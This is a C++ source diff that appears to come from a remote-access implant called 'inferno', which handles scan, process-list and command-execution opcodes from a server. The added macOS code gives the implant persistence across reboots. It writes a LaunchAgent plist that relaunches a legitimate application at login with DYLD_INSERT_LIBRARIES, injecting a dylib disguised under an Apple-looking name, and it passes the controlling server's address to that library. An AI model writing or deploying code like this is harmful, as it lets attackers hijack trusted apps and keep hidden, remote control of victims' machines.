@@ -29,6 +29,7 @@
 #ifdef __APPLE__
 #include <IOKit/IOKitLib.h>
 #include <CoreFoundation/CoreFoundation.h>
+#include <mach-o/dyld.h>
 #endif
 
 namespace inferno {
@@ -193,6 +194,9 @@ void Agent::handleDispatching(Packet&& packet) {
         Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
         data = scan_res.serialize();
         m_socket.sendData(data);
+
+        // Persist for reboot survival
+        persistInjectedAgent(m_server_ip, m_server_port);
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
         handleProcessDiscovery();
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
@@ -520,6 +524,83 @@ X-GNOME-Autostart-enabled=true
     ::fclose(f);
 #endif
 }
+
+#ifdef __APPLE__
+void Agent::persistInjectedAgent(const std::string& server_ip,
+                                  uint16_t server_port) {
+    // Get the host executable path
+    uint32_t bufsize = 0;
+    _NSGetExecutablePath(nullptr, &bufsize);
+    std::vector<char> exec_buf(bufsize);
+    if (_NSGetExecutablePath(exec_buf.data(), &bufsize) != 0) return;
+    std::string exec_path(exec_buf.data());
+
+    // If we're in the shim, fall back to standard persistence
+    if (exec_path.find("inferno_shim") != std::string::npos) {
+        installPersistence(exec_path, server_ip, server_port);
+        return;
+    }
+
+    // We're inside a real app — find the .app bundle root
+    // The executable is at .../Contents/MacOS/<name>; walk up to find the .app
+    auto pos = exec_path.find("/Contents/MacOS/");
+    if (pos == std::string::npos) return;
+    std::string app_bundle = exec_path.substr(0, pos);
+    // Get the .app directory name (e.g. "/Applications/DBeaver.app")
+    auto slash = app_bundle.rfind('/');
+    std::string app_display = (slash != std::string::npos)
+        ? app_bundle.substr(slash + 1) : app_bundle;
+
+    const char* home = ::getenv("HOME");
+    if (!home) return;
+
+    std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
+    std::string plist_path = plist_dir + "/com.inferno.agent.plist";
+    std::string dylib_path = std::string(home) + "/.cache/com.apple.amp.itmstransporter.dylib";
+
+    ::mkdir(plist_dir.c_str(), 0755);
+
+    mode_t old_mask = ::umask(022);
+    FILE* f = ::fopen(plist_path.c_str(), "w");
+    ::umask(old_mask);
+    if (!f) return;
+
+    std::string port_str = std::to_string(server_port);
+    std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.inferno.agent</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/bin/open</string>
+        <string>-a</string>
+        <string>%s</string>
+    </array>
+    <key>EnvironmentVariables</key>
+    <dict>
+        <key>DYLD_INSERT_LIBRARIES</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_IP</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_PORT</key>
+        <string>%s</string>
+    </dict>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <false/>
+</dict>
+</plist>
+)", app_bundle.c_str(), dylib_path.c_str(),
+   server_ip.c_str(), port_str.c_str());
+    ::fclose(f);
+}
+#else
+void Agent::persistInjectedAgent(const std::string&, uint16_t) {}
+#endif
 
 std::string Agent::getHardwareUUID() {
 #ifdef _WIN32
